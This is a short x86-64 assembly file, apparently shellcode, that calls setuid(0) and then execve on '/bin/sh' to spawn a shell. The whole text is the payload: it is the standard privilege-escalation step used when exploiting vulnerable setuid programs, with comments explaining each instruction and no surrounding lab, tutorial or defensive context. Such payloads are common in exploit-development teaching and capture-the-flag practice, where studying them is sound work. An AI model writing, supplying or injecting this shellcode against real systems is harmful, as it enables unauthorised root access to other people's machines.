.global _start
.intel_syntax noprefix
_start:
    # setuid to 0
    xor rdi, rdi                    # set uid to 0
    mov al, 0x69                    # syscall for setuid
    syscall

    # call execve with /bin/sh
    mov rbx, 0x0068732f6e69622f     # mov "/bin/sh\0" into rbx
    push rbx                        # push "/bin/sh\0" onto the stack
    mov rdi, rsp                    # point rdi at the stack
    xor rsi, rsi                    # set argv to NULL
    xor rdx, rdx                    # set envp to NULL
    mov al, 0x3b                    # syscall for execve
    syscall